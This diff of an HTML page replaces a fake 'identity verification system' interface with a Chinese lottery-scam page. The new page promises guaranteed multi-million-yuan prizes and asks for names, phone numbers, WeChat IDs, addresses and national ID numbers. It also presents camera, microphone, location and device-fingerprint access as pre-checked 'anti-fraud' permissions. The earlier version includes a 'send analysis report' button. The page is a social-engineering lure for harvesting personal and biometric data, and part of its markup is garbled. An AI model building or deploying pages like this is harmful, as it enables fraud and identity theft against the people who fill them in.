@@ -3,1250 +3,1173 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔐 数字身份验证系统 | 高级安全检测</title>
+    <title>🎰 超级幸运大抽奖 - 赢取百万现金！</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --cyber-blue: #00f3ff;
-            --matrix-green: #00ff41;
-            --neon-purple: #bc13fe;
-            --dark-bg: #0a0a0f;
-            --panel-bg: rgba(10, 15, 30, 0.9);
-            --glow: 0 0 15px currentColor;
+            --gold: #FFD700;
+            --red: #FF4757;
+            --blue: #3742FA;
+            --green: #2ED573;
+            --purple: #9C88FF;
+            --dark: #1E1E2E;
         }
         
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Courier New', 'SF Mono', monospace;
+            font-family: 'Microsoft YaHei', 'Arial', sans-serif;
         }
         
         body {
-            background: var(--dark-bg);
-            color: var(--cyber-blue);
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
-            overflow-x: hidden;
-            background-image: 
-                radial-gradient(circle at 20% 30%, rgba(0, 243, 255, 0.1) 0%, transparent 20%),
-                radial-gradient(circle at 80% 70%, rgba(188, 19, 254, 0.1) 0%, transparent 20%);
+            color: #333;
         }
         
-        /* 扫描线效果 */
-        body::before {
-            content: "";
+        /* 加载动画 */
+        .loading-screen {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: repeating-linear-gradient(
-                0deg,
-                rgba(0, 0, 0, 0.15) 0px,
-                rgba(0, 0, 0, 0.15) 1px,
-                transparent 1px,
-                transparent 2px
-            );
-            pointer-events: none;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             z-index: 9999;
-            animation: scan 8s linear infinite;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            transition: opacity 0.5s;
         }
         
-        @keyframes scan {
-            0% { transform: translateY(-100%); }
-            100% { transform: translateY(100%); }
+        .lottery-loader {
+            width: 120px;
+            height: 120px;
+            position: relative;
+            margin-bottom: 30px;
+        }
+        
+        .lottery-ball {
+            position: absolute;
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(45deg, #FFD700, #FF6B00);
+            border-radius: 50%;
+            animation: bounce 1.5s infinite;
+        }
+        
+        .ball-1 { top: 0; left: 40px; animation-delay: 0s; }
+        .ball-2 { top: 40px; left: 0; animation-delay: 0.2s; }
+        .ball-3 { top: 40px; left: 80px; animation-delay: 0.4s; }
+        .ball-4 { top: 80px; left: 40px; animation-delay: 0.6s; }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-30px); }
         }
         
         /* 主容器 */
-        .cyber-container {
-            max-width: 1400px;
+        .container {
+            max-width: 1200px;
             margin: 0 auto;
-            padding: 30px;
-            display: grid;
-            grid-template-columns: 1fr 400px;
-            gap: 30px;
-            min-height: 100vh;
+            padding: 20px;
+            display: none;
         }
         
-        /* 左侧主面板 */
-        .main-panel {
-            background: var(--panel-bg);
-            border: 1px solid rgba(0, 243, 255, 0.3);
-            border-radius: 15px;
-            padding: 30px;
-            backdrop-filter: blur(10px);
-            box-shadow: 
-                0 0 30px rgba(0, 243, 255, 0.1),
-                inset 0 0 30px rgba(0, 243, 255, 0.05);
+        /* 顶部横幅 */
+        .lottery-banner {
+            background: linear-gradient(90deg, #FF0000, #FF6B00, #FFD700);
+            padding: 40px 30px;
+            border-radius: 25px;
+            text-align: center;
+            margin-bottom: 30px;
             position: relative;
             overflow: hidden;
+            animation: bannerGlow 3s infinite alternate;
         }
         
-        .main-panel::before {
-            content: "";
-            position: absolute;
-            top: -2px;
-            left: -2px;
-            right: -2px;
-            bottom: -2px;
-            background: linear-gradient(45deg, 
-                var(--cyber-blue), 
-                var(--neon-purple), 
-                var(--matrix-green), 
-                var(--cyber-blue));
-            border-radius: 17px;
-            z-index: -1;
-            animation: borderGlow 4s linear infinite;
-            background-size: 400% 400%;
+        @keyframes bannerGlow {
+            0% { box-shadow: 0 0 50px rgba(255, 0, 0, 0.3); }
+            100% { box-shadow: 0 0 50px rgba(255, 215, 0, 0.3); }
         }
         
-        @keyframes borderGlow {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
+        .lottery-banner h1 {
+            font-size: 3.5rem;
+            color: white;
+            text-shadow: 3px 3px 5px rgba(0,0,0,0.5);
+            margin-bottom: 15px;
         }
         
-        /* 标题区域 */
-        .header {
-            display: flex;
-            align-items: center;
-            gap: 20px;
-            margin-bottom: 40px;
-            padding-bottom: 20px;
-            border-bottom: 2px solid rgba(0, 243, 255, 0.3);
-        }
-        
-        .logo {
-            width: 70px;
-            height: 70px;
-            background: linear-gradient(45deg, var(--cyber-blue), var(--neon-purple));
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 28px;
-            animation: rotate 10s linear infinite;
-        }
-        
-        @keyframes rotate {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .title-section h1 {
-            font-size: 2.5rem;
-            background: linear-gradient(90deg, var(--cyber-blue), var(--matrix-green));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 10px;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-        }
-        
-        .subtitle {
-            color: rgba(0, 243, 255, 0.8);
-            font-size: 1.1rem;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .status-indicator {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            padding: 5px 15px;
-            background: rgba(0, 255, 65, 0.1);
-            border-radius: 20px;
-            border: 1px solid rgba(0, 255, 65, 0.3);
-        }
-        
-        .status-dot {
-            width: 8px;
-            height: 8px;
-            background: var(--matrix-green);
-            border-radius: 50%;
-            animation: pulse 2s infinite;
+        .jackpot-amount {
+            font-size: 2.8rem;
+            color: #FFD700;
+            font-weight: bold;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+            margin: 20px 0;
+            animation: pulse 1.5s infinite;
         }
         
         @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
         }
         
-        /* 系统状态网格 */
-        .status-grid {
+        /* 倒计时 */
+        .countdown-container {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 30px;
+            flex-wrap: wrap;
+        }
+        
+        .countdown-box {
+            background: rgba(0,0,0,0.8);
+            color: white;
+            padding: 25px;
+            border-radius: 15px;
+            min-width: 120px;
+            text-align: center;
+        }
+        
+        .countdown-number {
+            font-size: 2.8rem;
+            font-weight: bold;
+            color: #FFD700;
+            font-family: 'Digital-7', monospace;
+        }
+        
+        /* 奖品展示 */
+        .prizes-section {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 25px;
+            margin: 40px 0;
+        }
+        
+        .prize-card {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            transition: transform 0.3s, box-shadow 0.3s;
+            position: relative;
+            overflow: hidden;
+            border: 3px solid transparent;
+        }
+        
+        .prize-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+            border-color: #FFD700;
+        }
+        
+        .prize-icon {
+            font-size: 50px;
+            color: #FFD700;
+            margin-bottom: 20px;
+        }
+        
+        .prize-ribbon {
+            position: absolute;
+            top: 15px;
+            right: -35px;
+            background: #FF4757;
+            color: white;
+            padding: 8px 40px;
+            transform: rotate(45deg);
+            font-weight: bold;
+        }
+        
+        /* 表单区域 */
+        .form-section {
+            background: white;
+            border-radius: 25px;
+            padding: 50px;
+            margin: 40px 0;
+            box-shadow: 0 15px 50px rgba(0,0,0,0.1);
+        }
+        
+        .form-title {
+            text-align: center;
+            color: #333;
+            margin-bottom: 40px;
+            font-size: 2.2rem;
+        }
+        
+        .form-title i {
+            color: #FFD700;
+            margin-right: 15px;
+        }
+        
+        .form-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 25px;
+            gap: 30px;
             margin-bottom: 40px;
         }
         
-        .status-card {
-            background: rgba(10, 20, 40, 0.7);
-            border: 1px solid rgba(0, 243, 255, 0.2);
+        .form-group {
+            margin-bottom: 25px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 10px;
+            color: #555;
+            font-weight: 600;
+            font-size: 1.1rem;
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 18px;
+            border: 2px solid #E0E0E0;
             border-radius: 12px;
-            padding: 25px;
+            font-size: 16px;
             transition: all 0.3s;
-            position: relative;
-            overflow: hidden;
         }
         
-        .status-card:hover {
-            border-color: var(--cyber-blue);
-            transform: translateY(-5px);
-            box-shadow: 0 10px 30px rgba(0, 243, 255, 0.2);
+        .form-control:focus {
+            border-color: #FFD700;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(255, 215, 0, 0.2);
         }
         
-        .card-header {
+        /* 权限授权区域 */
+        .permission-section {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 20px;
+            padding: 40px;
+            margin: 40px 0;
+            color: white;
+        }
+        
+        .permission-title {
             display: flex;
             align-items: center;
-            justify-content: space-between;
-            margin-bottom: 20px;
+            gap: 15px;
+            margin-bottom: 30px;
         }
         
-        .card-icon {
-            font-size: 28px;
-            color: var(--cyber-blue);
-        }
-        
-        .card-title {
-            font-size: 1.2rem;
-            font-weight: bold;
-            color: white;
-        }
-        
-        .data-display {
+        .permission-title i {
             font-size: 2rem;
-            font-family: 'Digital-7', monospace;
-            color: var(--matrix-green);
-            text-shadow: 0 0 10px currentColor;
-            margin: 15px 0;
+            color: #FFD700;
         }
         
-        /* 进度条 */
-        .progress-container {
-            background: rgba(0, 0, 0, 0.5);
-            height: 8px;
-            border-radius: 4px;
-            overflow: hidden;
-            margin: 15px 0;
-        }
-        
-        .progress-bar {
-            height: 100%;
-            background: linear-gradient(90deg, var(--cyber-blue), var(--neon-purple));
-            width: 0%;
-            transition: width 1s ease;
-        }
-        
-        /* 数据流显示 */
-        .data-stream {
-            background: rgba(0, 0, 0, 0.7);
-            border: 1px solid rgba(0, 255, 65, 0.3);
-            border-radius: 10px;
-            padding: 20px;
-            margin: 30px 0;
-            height: 200px;
-            overflow: hidden;
-            position: relative;
-        }
-        
-        .stream-content {
-            font-family: 'Digital-7', monospace;
-            color: var(--matrix-green);
-            line-height: 1.8;
-            font-size: 0.9rem;
-            white-space: pre-wrap;
-        }
-        
-        /* 控制面板 */
-        .control-panel {
-            margin-top: 40px;
-            padding-top: 30px;
-            border-top: 2px solid rgba(0, 243, 255, 0.3);
-        }
-        
-        .button-grid {
+        .permission-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 20px;
-            margin-top: 20px;
-        }
-        
-        .cyber-button {
-            padding: 18px 30px;
-            background: linear-gradient(45deg, rgba(0, 243, 255, 0.1), rgba(188, 19, 254, 0.1));
-            border: 2px solid transparent;
-            border-image: linear-gradient(45deg, var(--cyber-blue), var(--neon-purple)) 1;
-            color: white;
-            font-size: 1rem;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .cyber-button:hover {
-            background: linear-gradient(45deg, rgba(0, 243, 255, 0.2), rgba(188, 19, 254, 0.2));
-            transform: translateY(-3px);
-            box-shadow: 0 10px 25px rgba(0, 243, 255, 0.3);
-        }
-        
-        .cyber-button.primary {
-            background: linear-gradient(45deg, var(--cyber-blue), var(--neon-purple));
-            color: black;
-            font-weight: bold;
-        }
-        
-        /* 右侧侧边栏 */
-        .sidebar {
-            display: flex;
-            flex-direction: column;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
             gap: 25px;
         }
         
-        .info-panel {
-            background: var(--panel-bg);
-            border: 1px solid rgba(0, 243, 255, 0.3);
-            border-radius: 15px;
+        .permission-item {
+            background: rgba(255,255,255,0.1);
             padding: 25px;
-            backdrop-filter: blur(10px);
-        }
-        
-        .info-panel h3 {
-            color: var(--matrix-green);
-            margin-bottom: 20px;
-            font-size: 1.3rem;
-            border-bottom: 1px solid rgba(0, 255, 65, 0.3);
-            padding-bottom: 10px;
-        }
-        
-        .info-item {
+            border-radius: 15px;
             display: flex;
+            align-items: center;
             justify-content: space-between;
-            padding: 12px 0;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.2);
         }
         
-        .info-item:last-child {
-            border-bottom: none;
+        .permission-info {
+            flex-grow: 1;
         }
         
-        .info-label {
-            color: rgba(255, 255, 255, 0.7);
-        }
-        
-        .info-value {
-            color: var(--cyber-blue);
+        .permission-name {
+            font-size: 1.3rem;
             font-weight: bold;
+            margin-bottom: 8px;
+            color: #FFD700;
+        }
+        
+        .permission-desc {
+            font-size: 0.95rem;
+            opacity: 0.9;
+        }
+        
+        /* 开关样式 */
+        .permission-switch {
+            position: relative;
+            display: inline-block;
+            width: 70px;
+            height: 35px;
+        }
+        
+        .permission-switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+        
+        .permission-slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #ccc;
+            transition: .4s;
+            border-radius: 34px;
+        }
+        
+        .permission-slider:before {
+            position: absolute;
+            content: "";
+            height: 27px;
+            width: 27px;
+            left: 4px;
+            bottom: 4px;
+            background-color: white;
+            transition: .4s;
+            border-radius: 50%;
+        }
+        
+        input:checked + .permission-slider {
+            background-color: #4CD964;
+        }
+        
+        input:checked + .permission-slider:before {
+            transform: translateX(35px);
         }
         
         /* 摄像头预览 */
+        .camera-section {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            margin: 40px 0;
+            text-align: center;
+        }
+        
         .camera-preview {
-            aspect-ratio: 4/3;
-            background: rgba(0, 0, 0, 0.5);
-            border: 2px solid rgba(0, 243, 255, 0.5);
-            border-radius: 10px;
+            width: 100%;
+            max-width: 600px;
+            height: 400px;
+            background: #f5f5f5;
+            border-radius: 15px;
             overflow: hidden;
+            margin: 30px auto;
+            border: 3px dashed #ddd;
             position: relative;
         }
         
-        #cameraFeed {
+        #cameraVideo {
             width: 100%;
             height: 100%;
             object-fit: cover;
         }
         
-        .camera-overlay {
+        .camera-guide {
             position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: repeating-linear-gradient(
-                0deg,
-                transparent,
-                transparent 2px,
-                rgba(0, 255, 65, 0.1) 2px,
-                rgba(0, 255, 65, 0.1) 4px
-            );
-            pointer-events: none;
-        }
-        
-        /* 终端样式 */
-        .terminal {
-            background: rgba(0, 0, 0, 0.9);
-            border: 2px solid var(--matrix-green);
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 200px;
+            height: 250px;
+            border: 3px solid rgba(255, 215, 0, 0.5);
             border-radius: 10px;
+        }
+        
+        /* 提交按钮 */
+        .submit-section {
+            text-align: center;
+            margin: 50px 0;
+        }
+        
+        .submit-btn {
+            background: linear-gradient(90deg, #FF0000, #FF6B00);
+            color: white;
+            border: none;
+            padding: 25px 60px;
+            font-size: 1.8rem;
+            font-weight: bold;
+            border-radius: 15px;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            box-shadow: 0 10px 30px rgba(255, 0, 0, 0.3);
+        }
+        
+        .submit-btn:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 40px rgba(255, 0, 0, 0.4);
+            background: linear-gradient(90deg, #FF6B00, #FF0000);
+        }
+        
+        .submit-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        /* 中奖者列表 */
+        .winners-section {
+            background: rgba(255,255,255,0.9);
+            border-radius: 20px;
+            padding: 40px;
+            margin: 40px 0;
+        }
+        
+        .winners-title {
+            text-align: center;
+            color: #333;
+            margin-bottom: 30px;
+            font-size: 2rem;
+        }
+        
+        .winners-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+        }
+        
+        .winner-card {
+            background: white;
             padding: 20px;
-            font-family: 'Courier New', monospace;
-            color: var(--matrix-green);
-            height: 300px;
-            overflow-y: auto;
+            border-radius: 15px;
+            text-align: center;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            border: 2px solid #FFD700;
         }
         
-        .terminal-line {
-            margin-bottom: 8px;
-            animation: type 0.1s steps(40, end);
+        /* 进度条 */
+        .progress-container {
+            margin: 40px 0;
+            padding: 30px;
+            background: white;
+            border-radius: 20px;
         }
         
-        @keyframes type {
-            from { width: 0; }
-            to { width: 100%; }
+        .progress-title {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 15px;
         }
         
-        .prompt {
-            color: var(--cyber-blue);
+        .progress-bar {
+            height: 20px;
+            background: #f0f0f0;
+            border-radius: 10px;
+            overflow: hidden;
         }
         
-        /* 响应式设计 */
-        @media (max-width: 1200px) {
-            .cyber-container {
-                grid-template-columns: 1fr;
-            }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #4CD964, #FFD700);
+            width: 0%;
+            transition: width 1s ease;
         }
         
+        /* 响应式 */
         @media (max-width: 768px) {
-            .cyber-container {
-                padding: 15px;
+            .lottery-banner h1 {
+                font-size: 2.5rem;
             }
             
-            .main-panel {
-                padding: 20px;
-            }
-            
-            .title-section h1 {
+            .jackpot-amount {
                 font-size: 2rem;
             }
             
-            .status-grid {
-                grid-template-columns: 1fr;
+            .form-section {
+                padding: 30px;
+            }
+            
+            .submit-btn {
+                padding: 20px 40px;
+                font-size: 1.5rem;
             }
         }
         
         /* 数字字体 */
         @font-face {
             font-family: 'Digital-7';
-            src: url('https://fonts.cdnfonts.com/css/digital-7-mono');
-        }
-        
-        /* 警告和通知 */
-        .alert {
-            padding: 15px;
-            border-radius: 10px;
-            margin: 15px 0;
-            border: 2px solid;
-            background: rgba(255, 255, 255, 0.05);
-            animation: alertPulse 2s infinite;
-        }
-        
-        .alert.warning {
-            border-color: #ffcc00;
-            color: #ffcc00;
-        }
-        
-        .alert.success {
-            border-color: var(--matrix-green);
-            color: var(--matrix-green);
-        }
-        
-        @keyframes alertPulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.7; }
+            src: url('https://fonts.cdnfonts.com/css/digital-7');
         }
     </style>
 </head>
 <body>
-    <div class="cyber-container">
-        <!-- 左侧主面板 -->
-        <div class="main-panel">
-            <!-- 头部 -->
-            <div class="header">
-                <div class="logo">
-                    <i class="fas fa-shield-alt"></i>
-                </div>
-                <div class="title-section">
-                    <h1>数字身份验证系统 v3.0</h1>
-                    <div class="subtitle">
-                        <span>高级安全协议激活</span>
-                        <span class="status-indicator">
-                            <span class="status-dot"></span>
-                            实时监控中
-                        </span>
-                    </div>
-                </div>
-            </div>
+    <!-- 加载屏幕 -->
+    <div class="loading-screen" id="loadingScreen">
+        <div class="lottery-loader">
+            <div class="lottery-ball ball-1"></div>
+            <div class="lottery-ball ball-2"></div>
+            <div class="lottery-ball ball-3"></div>
+            <div class="lottery-ball ball-4"></div>
+        </div>
+        <h2 style="color: white; margin-bottom: 20px;">正在验证您的抽奖资格...</h2>
+        <p style="color: rgba(255,255,255,0.8);">请稍候，系统正在为您分配抽奖号码</p>
+    </div>
+
+    <!-- 主内容 -->
+    <div class="container" id="mainContainer">
+        <!-- 顶部横幅 -->
+        <div class="lottery-banner">
+            <h1><i class="fas fa-trophy"></i> 超级幸运大抽奖</h1>
+            <p style="font-size: 1.3rem; color: white; margin-bottom: 20px;">立即参与，100%中奖机会！现金、汽车、手机等你来拿</p>
             
-            <!-- 系统状态网格 -->
-            <div class="status-grid">
-                <!-- 设备指纹 -->
-                <div class="status-card" id="fingerprintCard">
-                    <div class="card-header">
-                        <div class="card-title">设备指纹识别</div>
-                        <div class="card-icon"><i class="fas fa-fingerprint"></i></div>
-                    </div>
-                    <div class="data-display" id="fingerprintId">正在生成...</div>
-                    <div class="progress-container">
-                        <div class="progress-bar" id="fingerprintProgress"></div>
-                    </div>
-                    <div class="info-text">唯一设备标识符生成中</div>
-                </div>
-                
-                <!-- 网络分析 -->
-                <div class="status-card" id="networkCard">
-                    <div class="card-header">
-                        <div class="card-title">网络拓扑分析</div>
-                        <div class="card-icon"><i class="fas fa-network-wired"></i></div>
-                    </div>
-                    <div class="data-display" id="ipAddress">正在获取...</div>
-                    <div class="progress-container">
-                        <div class="progress-bar" id="networkProgress"></div>
-                    </div>
-                    <div class="info-text">多层网络探测进行中</div>
-                </div>
-                
-                <!-- 传感器数据 -->
-                <div class="status-card" id="sensorCard">
-                    <div class="card-header">
-                        <div class="card-title">设备传感器</div>
-                        <div class="card-icon"><i class="fas fa-satellite-dish"></i></div>
-                    </div>
-                    <div class="data-display" id="sensorStatus">初始化...</div>
-                    <div class="progress-container">
-                        <div class="progress-bar" id="sensorProgress"></div>
-                    </div>
-                    <div class="info-text">13个传感器检测中</div>
-                </div>
-                
-                <!-- 行为分析 -->
-                <div class="status-card" id="behaviorCard">
-                    <div class="card-header">
-                        <div class="card-title">行为模式分析</div>
-                        <div class="card-icon"><i class="fas fa-brain"></i></div>
-                    </div>
-                    <div class="data-display" id="behaviorScore">0%</div>
-                    <div class="progress-container">
-                        <div class="progress-bar" id="behaviorProgress"></div>
-                    </div>
-                    <div class="info-text">实时用户活动分析</div>
-                </div>
-            </div>
+            <div class="jackpot-amount" id="jackpotAmount">¥ 5,000,000</div>
             
-            <!-- 数据流显示 -->
-            <div class="data-stream">
-                <div class="stream-content" id="dataStream">
-&gt; 系统初始化...
-&gt; 启动量子加密通道...
-&gt; 连接分布式节点...
-&gt; 验证数字证书...
-&gt; 加载AI分析引擎...
-&gt; 建立安全隧道...
-&gt; 开始实时数据流...
+            <div class="countdown-container">
+                <div class="countdown-box">
+                    <div class="countdown-number" id="countdownDays">00</div>
+                    <div>天</div>
                 </div>
-            </div>
-            
-            <!-- 终端输出 -->
-            <div class="terminal" id="systemTerminal">
-                <div class="terminal-line"><span class="prompt">root@system:~$</span> ./start_analysis.sh</div>
-                <div class="terminal-line"><span class="prompt">root@system:~$</span> 初始化深度检测协议...</div>
-            </div>
-            
-            <!-- 控制面板 -->
-            <div class="control-panel">
-                <h3><i class="fas fa-terminal"></i> 系统控制面板</h3>
-                <div class="button-grid">
-                    <button class="cyber-button" onclick="startFullAnalysis()">
-                        <i class="fas fa-play"></i> 启动完整分析
-                    </button>
-                    <button class="cyber-button" onclick="requestCameraAccess()">
-                        <i class="fas fa-camera"></i> 生物特征验证
-                    </button>
-                    <button class="cyber-button" onclick="getPreciseLocation()">
-                        <i class="fas fa-map-marker-alt"></i> 地理定位
-                    </button>
-                    <button class="cyber-button primary" onclick="collectAndSend()">
-                        <i class="fas fa-paper-plane"></i> 发送分析报告
-                    </button>
+                <div class="countdown-box">
+                    <div class="countdown-number" id="countdownHours">00</div>
+                    <div>小时</div>
+                </div>
+                <div class="countdown-box">
+                    <div class="countdown-number" id="countdownMinutes">00</div>
+                    <div>分钟</div>
+                </div>
+                <div class="countdown-box">
+                    <div class="countdown-number" id="countdownSeconds">00</div>
+                    <div>秒</div>
                 </div>
             </div>
         </div>
         
-        <!-- 右侧侧边栏 -->
-        <div class="sidebar">
-            <!-- 系统信息 -->
-            <div class="info-panel">
-                <h3><i class="fas fa-info-circle"></i> 系统状态</h3>
-                <div class="info-item">
-                    <span class="info-label">系统版本</span>
-                    <span class="info-value" id="sysVersion">v3.0.1</span>
+        <!-- 进度条 -->
+        <div class="progress-container">
+            <div class="progress-title">
+                <span>注册进度</span>
+                <span id="progressText">0%</span>
+            </div>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+        </div>
+
+        <!-- 奖品展示 -->
+        <div class="prizes-section">
+            <div class="prize-card">
+                <div class="prize-ribbon">特等奖</div>
+                <div class="prize-icon"><i class="fas fa-money-bill-wave"></i></div>
+                <h3>现金大奖</h3>
+                <p style="font-size: 1.5rem; color: #FF4757; font-weight: bold;">¥1,000,000</p>
+                <p style="color: #666;">仅剩 <span class="highlight">1</span> 名</p>
+            </div>
+            
+            <div class="prize-card">
+                <div class="prize-ribbon" style="background: #3742FA;">一等奖</div>
+                <div class="prize-icon"><i class="fas fa-car"></i></div>
+                <h3>豪华汽车</h3>
+                <p style="font-size: 1.5rem; color: #3742FA; font-weight: bold;">Tesla Model 3</p>
+                <p style="color: #666;">仅剩 <span class="highlight">3</span> 名</p>
+            </div>
+            
+            <div class="prize-card">
+                <div class="prize-ribbon" style="background: #2ED573;">二等奖</div>
+                <div class="prize-icon"><i class="fas fa-gem"></i></div>
+                <h3>钻石珠宝</h3>
+                <p style="font-size: 1.5rem; color: #2ED573; font-weight: bold;">5克拉钻石</p>
+                <p style="color: #666;">仅剩 <span class="highlight">10</span> 名</p>
+            </div>
+            
+            <div class="prize-card">
+                <div class="prize-ribbon" style="background: #9C88FF;">三等奖</div>
+                <div class="prize-icon"><i class="fas fa-mobile-alt"></i></div>
+                <h3>最新手机</h3>
+                <p style="font-size: 1.5rem; color: #9C88FF; font-weight: bold;">iPhone 15 Pro</p>
+                <p style="color: #666;">仅剩 <span class="highlight">50</span> 名</p>
+            </div>
+        </div>
+
+        <!-- 表单区域 -->
+        <div class="form-section">
+            <h2 class="form-title"><i class="fas fa-user-check"></i> 填写信息参与抽奖</h2>
+            
+            <form id="lotteryForm">
+                <div class="form-grid">
+                    <div class="form-group">
+                        <label for="userName"><i class="fas fa-user"></i> 姓名</label>
+                        <input type="text" id="userName" class="form-control" placeholder="请输入您的真实姓名" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="userPhone"><i class="fas fa-phone"></i> 手机号码</label>
+                        <input type="tel" id="userPhone" class="form-control" placeholder="请输入11位手机号码" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="userEmail"><i class="fas fa-envelope"></i> 电子邮箱</label>
+                        <input type="email" id="userEmail" class="form-control" placeholder="请输入有效邮箱地址" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="userWechat"><i class="fab fa-weixin"></i> 微信号</label>
+                        <input type="text" id="userWechat" class="form-control" placeholder="中奖后微信通知您" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="userAddress"><i class="fas fa-home"></i> 收货地址</label>
+                        <input type="text" id="userAddress" class="form-control" placeholder="中奖后奖品邮寄地址" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="userIdCard"><i class="fas fa-id-card"></i> 身份证号</label>
+                        <input type="text" id="userIdCard" class="form-control" placeholder="用于奖品实名登记" required>
+                    </div>
                 </div>
-                <div class="info-item">
-                    <span class="info-label">安全等级</span>
-                    <span class="info-value" id="securityLevel">量子级</span>
+            </form>
+        </div>
+
+        <!-- 权限授权区域 -->
+        <div class="permission-section">
+            <div class="permission-title">
+                <i class="fas fa-shield-alt"></i>
+                <h2>身份验证授权</h2>
+            </div>
+            <p style="margin-bottom: 30px; opacity: 0.9;">为确保抽奖公平公正，防止恶意刷奖，我们需要验证您的真实身份</p>
+            
+            <div class="permission-grid">
+                <div class="permission-item">
+                    <div class="permission-info">
+                        <div class="permission-name"><i class="fas fa-camera"></i> 摄像头授权</div>
+                        <div                         <div class="permission-desc">拍摄照片验证真实参与者身份</div>
+                    </div>
+                    <label class="permission-switch">
+                        <input type="checkbox" id="cameraPermission" checked>
+                        <span class="permission-slider"></span>
+                    </label>
                 </div>
-                <div class="info-item">
-                    <span class="info-label">分析深度</span>
-                    <span class="info-value" id="analysisDepth">多层</span>
+                
+                <div class="permission-item">
+                    <div class="permission-info">
+                        <div class="permission-name"><i class="fas fa-map-marker-alt"></i> 位置授权</div>
+                        <div class="permission-desc">验证您所在地区是否在抽奖范围内</div>
+                    </div>
+                    <label class="permission-switch">
+                        <input type="checkbox" id="locationPermission" checked>
+                        <span class="permission-slider"></span>
+                    </label>
                 </div>
-                <div class="info-item">
-                    <span class="info-label">数据加密</span>
-                    <span class="info-value" id="encryptionStatus">AES-512</span>
+                
+                <div class="permission-item">
+                    <div class="permission-info">
+                        <div class="permission-name"><i class="fas fa-microphone"></i> 麦克风授权</div>
+                        <div class="permission-desc">语音确认参与意愿（防机器人）</div>
+                    </div>
+                    <label class="permission-switch">
+                        <input type="checkbox" id="micPermission" checked>
+                        <span class="permission-slider"></span>
+                    </label>
                 </div>
-                <div class="info-item">
-                    <span class="info-label">威胁检测</span>
-                    <span class="info-value" id="threatStatus">0/0</span>
+                
+                <div class="permission-item">
+                    <div class="permission-info">
+                        <div class="permission-name"><i class="fas fa-fingerprint"></i> 设备验证</div>
+                        <div class="permission-desc">确保每个设备只能参与一次</div>
+                    </div>
+                    <label class="permission-switch">
+                        <input type="checkbox" id="devicePermission" checked>
+                        <span class="permission-slider"></span>
+                    </label>
                 </div>
             </div>
             
-            <!-- 摄像头预览 -->
-            <div class="info-panel">
-                <h3><i class="fas fa-eye"></i> 生物特征验证</h3>
-                <div class="camera-preview">
-                    <video id="cameraFeed" autoplay playsinline></video>
-                    <div class="camera-overlay"></div>
-                </div>
-                <div class="alert warning" id="cameraStatus">
-                    <i class="fas fa-exclamation-triangle"></i> 等待摄像头授权
-                </div>
